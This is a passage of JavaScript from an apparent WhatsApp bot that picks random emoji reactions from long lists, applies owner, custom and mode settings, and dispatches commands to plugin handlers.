'🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🐒', '🦍', '🦧', '🐶', '🐕', '🦮', "🐕‍🦺", '🐩', '🐺', '🦊', '🦝', '🐱', '🐈', "🐈‍⬛", '🦁', '🐯', '🐅', '🐆', '🐴', '🐎', '🦄', '🦓', '🦌', '🦬', '🐮', '🐂', '🐃', '🐄', '🐷', '🐖', '🐗', '🐽', '🐏', '🐑', '🐐', '🐪', '🐫', '🦙', '🦒', '🐘', '🦣', '🦏', '🦛', '🐭', '🐁', '🐀', '🐹', '🐰', '🐇', "🐿️", '🦫', '🦔', '🦇', '🐻', "🐻‍❄️", '🐨', '🐼', '🦥', '🦦', '🦨', '🦘', '🦡', '🐾', '🦃', '🐔', '🐓', '🐣', '🐤', '🐥', '🐦', '🐧', "🕊️", '🦅', '🦆', '🦢', '🦉', '🦤', '🪶', '🦩', '🦚', '🦜', '🐸', '🐊', '🐢', '🦎', '🐍', '🐲', '🐉', '🦕', '🦖', '🐳', '🐋', '🐬', '🦭', '🐟', '🐠', '😀', '😃', '😄', '😁', '😆', '😅', '🤣', '😂', '🙂', '🙃', '😉', '😊', '😇', '🥰', '😍', '🤩', '😘', '😗', '☺️', '😚', '😙', '🥲', '😋', '😛', '😜', '🤪', '😝', '🤑', '🤗', '🤭', '🤫', '🤔', '🤐', '🤨', '😐', '😑', '😶', "😶‍🌫️", '😏', '😒', '🙄', '😬', "😮‍💨", '🤥', '😌', '😔', '😪', '🤤', '😴', '😷', '🤒', '🤕', '🤢', '🤮', '🤧', '🥵', '🥶', '🥴', '😵', "😵‍💫", '🤯', '🤠', '🥳', '🥸', '😎', '🤓', '🧐', '😕', '😟', '🙁', '☹️', '😮', '😯', '😲', '😳', '🥺', '😦', '😧', '😨', '😰', '😥', '😢', '😭', '😱', '😖', '😣', '😞', '😓', '😩', '😫', '🥱', '😤', '😡', '😠', '🤬', '😈', '👿', '💀', '☠️', '💩', '🤡', '👹', '👺', '👻', '👽', '👾', '🤖', '😺', '😸', '😹', '😻', '😼', '😽', '🙀', '😿', '😾', '🙈', '🙉', '🙊', '💋', '💌', '💘', '💝', '💖', '💗', '💓', '💞', '💕', '💟', '❣️', '💔', "❤️‍🔥", "❤️‍🩹", '❤️', '🧡', '💛', '💚', '💙', '💜', '🤎', '🖤', '🤍', '💯', '💢', '💥', '💫', '💦', '💨', "🕳️", '💣', '💬', "👁️‍🗨️", "🗨️", "🗯️", '💭', '💤', '👋', '🤚', "🖐️", '✋', '🖖', '👌', '🤌', '🤏', '✌️', '🤞', '🤟', '🤘', '🤙', '👈', '👉', '👆', '🖕', '👇', '☝️', '👍', '👎', '✊', '👊', '🤛', '🤜', '👏', '🙌', '👐', '🤲', '🤝', '🙏', '✍️', '💅', '🤳', '💪', '🦾', '🦿', '🦵', '🦶', '👂', '🦻', '👃', '🧠', '🫀', '🫁', '🦷', '🦴', '👀', "👁️", '👅', '👄', '👶', '🧒', '👦', '👧', '🧑', '👱', '👨', '🧔', "🧔‍♂️", "🧔‍♀️", "👨‍🦰", "👨‍🦱", "👨‍🦳", "👨‍🦲", '👩', "👩‍🦰", "🧑‍🦰", "👩‍🦱", "🧑‍🦱", "👩‍🦳", "🧑‍🦳", "👩‍🦲", "🧑‍🦲", "👱‍♀️", "👱‍♂️", '🧓', '👴', '👵', '🙍', "🙍‍♂️", "🙍‍♀️", '🙎', "🙎‍♂️", "🙎‍♀️", '🙅', "🙅‍♂️", "🙅‍♀️", '🙆', "🙆‍♂️", "🙆‍♀️", '💁', "💁‍♂️", "💁‍♀️", '🙋', "🙋‍♂️", "🙋‍♀️", '🧏', "🧏‍♂️", "🧏‍♀️", '🙇', "🙇‍♂️", "🙇‍♀️", '🤦', "🤦‍♂️", "🤦‍♀️", '🤷', "🤷‍♂️", "🤷‍♀️", "🧑‍⚕️", "👨‍⚕️", "👩‍⚕️", "🧑‍🎓", "👨‍🎓", "👩‍🎓", "🧑‍🏫", '👨‍🏫', "👩‍🏫", "🧑‍⚖️", "👨‍⚖️", "👩‍⚖️", "🧑‍🌾", "👨‍🌾", "👩‍🌾", "🧑‍🍳", "👨‍🍳", "👩‍🍳", "🧑‍🔧", "👨‍🔧", "👩‍🔧", "🧑‍🏭", "👨‍🏭", "👩‍🏭", "🧑‍💼", "👨‍💼", "👩‍💼", "🧑‍🔬", "👨‍🔬", "👩‍🔬", "🧑‍💻", "👨‍💻", "👩‍💻", "🧑‍🎤", "👨‍🎤", "👩‍🎤", "🧑‍🎨", "👨‍🎨", "👩‍🎨", "🧑‍✈️", "👨‍✈️", "👩‍✈️", "🧑‍🚀", "👨‍🚀", "👩‍🚀", "🧑‍🚒", "👨‍🚒", "👩‍🚒", '👮', "👮‍♂️", "👮‍♀️", "🕵️", "🕵️‍♂️", "🕵️‍♀️", '💂', "💂‍♂️", "💂‍♀️", '🥷', '👷', "👷‍♂️", "👷‍♀️", '🤴', '👸', '👳', "👳‍♂️", "👳‍♀️", '👲', '🧕', '🤵', "🤵‍♂️", "🤵‍♀️", '👰', "👰‍♂️", "👰‍♀️", '🤰', '🤱', "👩‍🍼", "👨‍🍼", "🧑‍🍼", '👼', '🎅', '🤶', "🧑‍🎄", '🦸', "🦸‍♂️", "🦸‍♀️", '🦹', "🦹‍♂️", "🦹‍♀️", '🧙', "🧙‍♂️", "🧙‍♀️", '🧚', "🧚‍♂️", "🧚‍♀️", '🧛', "🧛‍♂️", "🧛‍♀️", '🧜', "🧜‍♂️", "🧜‍♀️", '🧝', "🧝‍♂️", "🧝‍♀️", '🧞', "🧞‍♂️", "🧞‍♀️", '🧟', "🧟‍♂️", "🧟‍♀️", '💆', "💆‍♂️", "💆‍♀️", '💇', "💇‍♂️", "💇‍♀️", '🚶', "🚶‍♂️", "🚶‍♀️", '🧍', "🧍‍♂️", "🧍‍♀️", '🧎', "🧎‍♂️", "🧎‍♀️", "🧑‍🦯", "👨‍🦯", "👩‍🦯", "🧑‍🦼", "👨‍🦼", "👩‍🦼", "🧑‍🦽", "👨‍🦽", "👩‍🦽", '🏃', "🏃‍♂️", "🏃‍♀️", '💃', '🕺', "🕴️", '👯', "👯‍♂️", "👯‍♀️", '🧖', "🧖‍♂️", "🧖‍♀️", '🧗', "🧗‍♂️", "🧗‍♀️", '🤺', '🏇', '⛷️', '🏂', "🏌️", "🏌️‍♂️", "🏌️‍♀️", '🏄', "🏄‍♂️", "🏄‍♀️", '🚣', "🚣‍♂️", "🚣‍♀️", '🏊', "🏊‍♂️", "🏊‍♀️", '⛹️', "⛹️‍♂️", "⛹️‍♀️", "🏋️", "🏋️‍♂️", "🏋️‍♀️", '🚴', "🚴‍♂️", '🚴‍♀️', '🚵', "🚵‍♂️", "🚵‍♀️", '🤸', "🤸‍♂️", "🤸‍♀️", '🤼', "🤼‍♂️", "🤼‍♀️", '🤽', "🤽‍♂️", "🤽‍♀️", '🤾', "🤾‍♂️", "🤾‍♀️", '🤹', "🤹‍♂️", "🤹‍♀️", '🧘', "🧘‍♂️", "🧘‍♀️", '🛀', '🛌', "🧑‍🤝‍🧑", '👭', '👫', '👬', '💏', "👩‍❤️‍💋‍👨", "👨‍❤️‍💋‍👨", "👩‍❤️‍💋‍👩", '💑', "👩‍❤️‍👨", "👨‍❤️‍👨", "👩‍❤️‍👩", '👪', "👨‍👩‍👦", "👨‍👩‍👧", "👨‍👩‍👧‍👦", "👨‍👩‍👦‍👦", "👨‍👩‍👧‍👧", "👨‍👨‍👦", '👨‍👨‍👧', "👨‍👨‍👧‍👦", "👨‍👨‍👦‍👦", "👨‍👨‍👧‍👧", "👩‍👩‍👦", "👩‍👩‍👧", "👩‍👩‍👧‍👦", "👩‍👩‍👦‍👦", "👩‍👩‍👧‍👧", "👨‍👦", "👨‍👦‍👦", "👨‍👧", "👨‍👧‍👦", "👨‍👧‍👧", "👩‍👦", "👩‍👦‍👦", "👩‍👧", "👩‍👧‍👦", "👩‍👧‍👧", "🗣️", '👤', '👥', '🫂', '👣', '🦰', '🦱', '🦳', '🦲', '🐵'];
  
          const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]; // 
          m.react(randomReaction);
      }
  }
  
  // Owner React
  if (!isReact && senderNumber === botNumber) {
      if (config.AUTO_REACT === 'true') {
          const reactions = ['😊', '👍', '😂', '💯', '🔥', '🙏', '🎉', '👏', '😎', '🤖', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '🙂', '😑', '🤣', '😍', '😘', '😗', '😙', '😚', '😛', '😝', '😞', '😟', '😠', '😡', '😢', '😭', '😓', '😳', '😴', '😌', '😆', '😂', '🤔', '😒', '😓', '😶', '🙄', '🐶', '🐱', '🐔', '🐷', '🐴', '🐲', '🐸', '🐳', '🐋', '🐒', '🐑', '🐕', '🐩', '🍔', '🍕', '🥤', '🍣', '🍲', '🍴', '🍽', '🍹', '🍸', '🎂', '📱', '📺', '📻', '🎤', '📚', '💻', '📸', '📷', '❤️', '💔', '❣️', '☀️', '🌙', '🌃', '🏠', '🚪', "🇺🇸", "🇬🇧", "🇨🇦", "🇦🇺", "🇯🇵", "🇫🇷", "🇪🇸", '👍', '👎', '👏', '👫', '👭', '👬', '👮', '🤝', '🙏', '👑', '🌻', '🌺', '🌸', '🌹', '🌴', "🏞️", '🌊', '🚗', '🚌', "🛣️", "🛫️", "🛬️", '🚣', '🛥', '🚂', '🚁', '🚀', "🏃‍♂️", "🏋️‍♀️", "🏊‍♂️", "🏄‍♂️", '🎾', '🏀', '🏈', '🎯', '🏆', '??', '⬆️', '⬇️', '⇒', '⇐', '↩️', '↪️', 'ℹ️', '‼️', '⁉️', '‽️', '©️', '®️', '™️', '🔴', '🔵', '🟢', '🔹', '🔺', '💯', '👑', '🤣', "🤷‍♂️", "🤷‍♀️", "🙅‍♂️", "🙅‍♀️", "🙆‍♂️", "🙆‍♀️", "🤦‍♂️", "🤦‍♀️", '🏻', '💆‍♂️', "💆‍♀️", "🕴‍♂️", "🕴‍♀️", "💇‍♂️", "💇‍♀️", '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '�', '🏯', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🌳', '🌲', '🌾', '🌿', '🍃', '🍂', '🍃', '🌻', '💐', '🌹', '🌺', '🌸', '🌴', '🏵', '🎀', '🏆', '🏈', '🏉', '🎯', '🏀', '🏊', '🏋', '🏌', '🎲', '📚', '📖', '📜', '📝', '💭', '💬', '🗣', '💫', '🌟', '🌠', '🎉', '🎊', '👏', '💥', '🔥', '💥', '🌪', '💨', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌱', '🌿', '🍃', '🍂', '🌻', '💐', '🌹', '🌺', '🌸', '🌴', '🏵', '🎀', '🏆', '🏈', '🏉', '🎯', '🏀', '🏊', '🏋', '🏌', '🎲', '📚', '📖', '📜', '📝', '💭', '💬', '🗣', '💫', '🌟', '🌠', '🎉', '🎊', '👏', '💥', '🔥', '💥', '🌪', '💨', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🐒', '🦍', '🦧', '🐶', '🐕', '🦮', "🐕‍🦺", '🐩', '🐺', '🦊', '🦝', '🐱', '🐈', "🐈‍⬛", '🦁', '🐯', '🐅', '🐆', '🐴', '🐎', '🦄', '🦓', '🦌', '🦬', '🐮', '🐂', '🐃', '🐄', '🐷', '🐖', '🐗', '🐽', '🐏', '🐑', '🐐', '🐪', '🐫', '🦙', '🦒', '🐘', '🦣', '🦏', '🦛', '🐭', '🐁', '🐀', '🐹', '🐰', '🐇', "🐿️", '🦫', '🦔', '🦇', '🐻', "🐻‍❄️", '🐨', '🐼', '🦥', '🦦', '🦨', '🦘', '🦡', '🐾', '🦃', '🐔', '🐓', '🐣', '🐤', '🐥', '🐦', '🐧', "🕊️", '🦅', '🦆', '🦢', '🦉', '🦤', '🪶', '🦩', '🦚', '🦜', '🐸', '🐊', '🐢', '🦎', '🐍', '🐲', '🐉', '🦕', '🦖', '🐳', '🐋', '🐬', '🦭', '🐟', '🐠', '😀', '😃', '😄', '😁', '😆', '😅', '🤣', '😂', '🙂', '🙃', '😉', '😊', '😇', '🥰', '😍', '🤩', '😘', '😗', '☺️', '😚', '😙', '🥲', '😋', '😛', '😜', '🤪', '😝', '🤑', '🤗', '🤭', '🤫', '🤔', '🤐', '🤨', '😐', '😑', '😶', "😶‍🌫️", '😏', '😒', '🙄', '😬', "😮‍💨", '🤥', '😌', '😔', '😪', '🤤', '😴', '😷', '🤒', '🤕', '🤢', '🤮', '🤧', '🥵', '🥶', '🥴', '😵', "😵‍💫", '🤯', '🤠', '🥳', '🥸', '😎', '🤓', '🧐', '😕', '😟', '🙁', '☹️', '😮', '😯', '😲', '😳', '🥺', '😦', '😧', '😨', '😰', '😥', '😢', '😭', '😱', '😖', '😣', '😞', '😓', '😩', '😫', '🥱', '😤', '😡', '😠', '🤬', '😈', '👿', '💀', '☠️', '💩', '🤡', '👹', '👺', '👻', '👽', '👾', '🤖', '😺', '😸', '😹', '😻', '😼', '😽', '🙀', '😿', '😾', '🙈', '🙉', '🙊', '💋', '💌', '💘', '💝', '💖', '💗', '💓', '💞', '💕', '💟', '❣️', '💔', "❤️‍🔥", "❤️‍🩹", '❤️', '🧡', '💛', '💚', '💙', '💜', '🤎', '🖤', '🤍', '💯', '💢', '💥', '💫', '💦', '💨', "🕳️", '💣', '💬', "👁️‍🗨️", "🗨️", "🗯️", '💭', '💤', '👋', '🤚', "🖐️", '✋', '🖖', '👌', '🤌', '🤏', '✌️', '🤞', '🤟', '🤘', '🤙', '👈', '👉', '👆', '🖕', '👇', '☝️', '👍', '👎', '✊', '👊', '🤛', '🤜', '👏', '🙌', '👐', '🤲', '🤝', '🙏', '✍️', '💅', '🤳', '💪', '🦾', '🦿', '🦵', '🦶', '👂', '🦻', '👃', '🧠', '🫀', '🫁', '🦷', '🦴', '👀', "👁️", '👅', '👄', '👶', '🧒', '👦', '👧', '🧑', '👱', '👨', '🧔', "🧔‍♂️", "🧔‍♀️", "👨‍🦰", "👨‍🦱", "👨‍🦳", "👨‍🦲", '👩', "👩‍🦰", "🧑‍🦰", "👩‍🦱", "🧑‍🦱", "👩‍🦳", "🧑‍🦳", "👩‍🦲", "🧑‍🦲", "👱‍♀️", "👱‍♂️", '🧓', '👴', '👵', '🙍', "🙍‍♂️", "🙍‍♀️", '🙎', "🙎‍♂️", "🙎‍♀️", '🙅', "🙅‍♂️", "🙅‍♀️", '🙆', "🙆‍♂️", "🙆‍♀️", '💁', "💁‍♂️", "💁‍♀️", '🙋', "🙋‍♂️", "🙋‍♀️", '🧏', "🧏‍♂️", "🧏‍♀️", '🙇', "🙇‍♂️", "🙇‍♀️", '🤦', "🤦‍♂️", "🤦‍♀️", '🤷', "🤷‍♂️", "🤷‍♀️", "🧑‍⚕️", "👨‍⚕️", "👩‍⚕️", "🧑‍🎓", "👨‍🎓", "👩‍🎓", "🧑‍🏫", '👨‍🏫', "👩‍🏫", "🧑‍⚖️", "👨‍⚖️", "👩‍⚖️", "🧑‍🌾", "👨‍🌾", "👩‍🌾", "🧑‍🍳", "👨‍🍳", "👩‍🍳", "🧑‍🔧", "👨‍🔧", "👩‍🔧", "🧑‍🏭", "👨‍🏭", "👩‍🏭", "🧑‍💼", "👨‍💼", "👩‍💼", "🧑‍🔬", "👨‍🔬", "👩‍🔬", "🧑‍💻", "👨‍💻", "👩‍💻", "🧑‍🎤", "👨‍🎤", "👩‍🎤", "🧑‍🎨", "👨‍🎨", "👩‍🎨", "🧑‍✈️", "👨‍✈️", "👩‍✈️", "🧑‍🚀", "👨‍🚀", "👩‍🚀", "🧑‍🚒", "👨‍🚒", "👩‍🚒", '👮', "👮‍♂️", "👮‍♀️", "🕵️", "🕵️‍♂️", "🕵️‍♀️", '💂', "💂‍♂️", "💂‍♀️", '🥷', '👷', "👷‍♂️", "👷‍♀️", '🤴', '👸', '👳', "👳‍♂️", "👳‍♀️", '👲', '🧕', '🤵', "🤵‍♂️", "🤵‍♀️", '👰', "👰‍♂️", "👰‍♀️", '🤰', '🤱', "👩‍🍼", "👨‍🍼", "🧑‍🍼", '👼', '🎅', '🤶', "🧑‍🎄", '🦸', "🦸‍♂️", "🦸‍♀️", '🦹', "🦹‍♂️", "🦹‍♀️", '🧙', "🧙‍♂️", "🧙‍♀️", '🧚', "🧚‍♂️", "🧚‍♀️", '🧛', "🧛‍♂️", "🧛‍♀️", '🧜', "🧜‍♂️", "🧜‍♀️", '🧝', "🧝‍♂️", "🧝‍♀️", '🧞', "🧞‍♂️", "🧞‍♀️", '🧟', "🧟‍♂️", "🧟‍♀️", '💆', "💆‍♂️", "💆‍♀️", '💇', "💇‍♂️", "💇‍♀️", '🚶', "🚶‍♂️", "🚶‍♀️", '🧍', "🧍‍♂️", "🧍‍♀️", '🧎', "🧎‍♂️", "🧎‍♀️", "🧑‍🦯", "👨‍🦯", "👩‍🦯", "🧑‍🦼", "👨‍🦼", "👩‍🦼", "🧑‍🦽", "👨‍🦽", "👩‍🦽", '🏃', "🏃‍♂️", "🏃‍♀️", '💃', '🕺', "🕴️", '👯', "👯‍♂️", "👯‍♀️", '🧖', "🧖‍♂️", "🧖‍♀️", '🧗', "🧗‍♂️", "🧗‍♀️", '🤺', '🏇', '⛷️', '🏂', "🏌️", "🏌️‍♂️", "🏌️‍♀️", '🏄', "🏄‍♂️", "🏄‍♀️", '🚣', "🚣‍♂️", "🚣‍♀️", '🏊', "🏊‍♂️", "🏊‍♀️", '⛹️', "⛹️‍♂️", "⛹️‍♀️", "🏋️", "🏋️‍♂️", "🏋️‍♀️", '🚴', "🚴‍♂️", '🚴‍♀️', '🚵', "🚵‍♂️", "🚵‍♀️", '🤸', "🤸‍♂️", "🤸‍♀️", '🤼', "🤼‍♂️", "🤼‍♀️", '🤽', "🤽‍♂️", "🤽‍♀️", '🤾', "🤾‍♂️", "🤾‍♀️", '🤹', "🤹‍♂️", "🤹‍♀️", '🧘', "🧘‍♂️", "🧘‍♀️", '🛀', '🛌', "🧑‍🤝‍🧑", '👭', '👫', '👬', '💏', "👩‍❤️‍💋‍👨", "👨‍❤️‍💋‍👨", "👩‍❤️‍💋‍👩", '💑', "👩‍❤️‍👨", "👨‍❤️‍👨", "👩‍❤️‍👩", '👪', "👨‍👩‍👦", "👨‍👩‍👧", "👨‍👩‍👧‍👦", "👨‍👩‍👦‍👦", "👨‍👩‍👧‍👧", "👨‍👨‍👦", '👨‍👨‍👧', "👨‍👨‍👧‍👦", "👨‍👨‍👦‍👦", "👨‍👨‍👧‍👧", "👩‍👩‍👦", "👩‍👩‍👧", "👩‍👩‍👧‍👦", "👩‍👩‍👦‍👦", "👩‍👩‍👧‍👧", "👨‍👦", "👨‍👦‍👦", "👨‍👧", "👨‍👧‍👦", "👨‍👧‍👧", "👩‍👦", "👩‍👦‍👦", "👩‍👧", "👩‍👧‍👦", "👩‍👧‍👧", "🗣️", '👤', '👥', '🫂', '👣', '🦰', '🦱', '🦳', '🦲', '🐵'];
          const randomOwnerReaction = reactions[Math.floor(Math.random() * reactions.length)]; // 
          m.react(randomOwnerReaction);
      }
  }
          
// custum react settings        
                        
if (!isReact && senderNumber !== botNumber) {
    if (config.CUSTOM_REACT === 'true') {
        // Use custom emojis from the configuration
        const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
        m.react(randomReaction);
    }
}

if (!isReact && senderNumber === botNumber) {
    if (config.CUSTOM_REACT === 'true') {
        // Use custom emojis from the configuration
        const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
        m.react(randomReaction);
    }
} 
        
  //==========WORKTYPE============ 
  if(!isOwner && config.MODE === "private") return
  if(!isOwner && isGroup && config.MODE === "inbox") return
  if(!isOwner && !isGroup && config.MODE === "groups") return
   
  // take commands 
                 
  const events = require('./command')
  const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
  if (isCmd) {
  const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
  if (cmd) {
  if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
  
  try {
  cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
  } catch (e) {
  console.error("[PLUGIN ERROR] " + e);
  }
  }
  }
  events.commands.map(async(command) => {
  if (body && command.on === "body") {
  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
  } else if (mek.q && command.on === "text") {
  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
  } else if (
  (command.on === "image" || command.on === "photo") &&
  mek.type === "imageMessage"
  ) {
